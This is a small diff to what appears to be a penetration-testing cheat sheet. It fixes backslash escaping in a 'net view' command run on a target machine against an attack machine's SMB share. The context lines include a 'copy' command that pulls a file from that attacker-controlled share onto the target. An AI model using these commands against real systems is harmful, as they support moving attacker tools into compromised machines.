@@ -89,7 +89,7 @@ Check with smbclient
 
 **On target machine**:
 or check on Windows
-> net view \\\[attack machine ip address\]
+> net view \\\\\[attack machine ip address\]
 
 Copy file 
 `copy \\[your ip address]\Sharepath .`
